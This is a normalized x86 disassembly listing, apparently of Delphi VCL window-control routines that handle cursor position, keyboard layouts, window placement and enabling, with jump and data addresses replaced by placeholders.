call sub_43a480
mov eax edi
call sub_43a078
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_43a078
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_43870c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_4350cc
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_43875c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a480
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_436a30
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_4032ec
sub_4387a4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4334b4
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_437a5c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452e00
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4512e8
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_4388f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4389d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4389da
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_43a170
mov dl [ ebx + 0x184 ]
call sub_43ec68
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_451260
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407b0c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_451060
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_451060
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_451060
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_4389e0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_438a6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438a71
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_451260
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407b0c
test eax eax
je r-xdata
mov eax ebx
call sub_43a170
mov dl 0x1
call sub_43ec4c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_438acc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_41241c
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_434b3c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_438b1c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_438b50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_4032ec
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_4032ec
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_438b90
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_434b3c
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_438be8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a014
mov edx [ r-xdata ]
call sub_4032a0
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_438c20
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_413860
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438c44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_43a170
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_438ca0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_438c0c
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413860
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_438ce0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405500
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405500
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_438d4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_438df4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438dfb
lea eax [ ebp - 0x4 ]
call sub_4054e8
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43161c
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_4030f0
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4054e8
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_4032ec
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405500
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ edi + 0x178 ] eax
sub_438e04
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_436a08
xor edx edx
push ebp
push sub_438ec6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_4032ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438ecd
mov eax [ ebp - 0x4 ]
call sub_436a10
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_438ecd
mov eax [ ebp - 0x4 ]
call sub_44a5dc
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_433bd0
sub_438f18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403038
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4357fc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_438f82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_433bd0
sub_438f9c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_438fc4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44a5dc
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44a4e4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_4032ec
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_438fc4
test al al
jne r-xdata
sub_43902c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438fc4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43b2bc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439058
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438fc4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43b2bc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439084
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_4390ac
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44a5dc
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44a4e4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_4032ec
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4390ac
test al al
jne r-xdata
sub_439114
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4390ac
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439134
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4390ac
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439174
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44a5dc
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_4032ec
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_439174
test al al
jne r-xdata
sub_4391d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439174
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4391f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_436e64
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_434b3c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4391f8
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_4392a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_4391f8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_44a5dc
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_434b3c
test eax eax
jne r-xdata
sub_439350
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439370
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_437df0
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4393a4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4393c4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_439414
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_439438
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_432c3c
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_436ea0
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_436e64
mov dl [ esp ]
mov si 0xffd1
call sub_4032ec
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_439490
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_4032ec
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4394b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_4032ec
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4394ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_435610
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_436f00
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_437710
sub_439524
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_4032ec
pop esi
pop ebx
retn
mov eax ebx
call sub_433fcc
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40436c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40436c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_4395a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437af0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4356e4
sub_439604
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_437864
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_436c60
pop ebx
retn
sub_439634
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_43965c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_436c60
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4396cc
push ebx
mov ebx eax
mov eax ebx
call sub_435550
mov eax ebx
call sub_43a474
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_436f00
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41cb6c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_434b3c
sub_439708
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43221c
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_43a170
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_434b3c
sub_439748
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43a474
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43a170
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439788
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_436f00
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_43a078
sub_4397c8
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_43a2b0
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_43a2b0
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_439828
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_434598
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4334b4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_437a5c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_439898
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_435688
mov edx esi
mov eax ebx
call sub_436ec0
pop esi
pop ebx
retn
sub_4398b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_4308ac
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_44a5dc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_4032ec
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_4032ec
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_4032ec
test al al
jne r-xdata
sub_439948
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43b2bc
mov edx esi
mov eax ebx
call sub_4398b4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
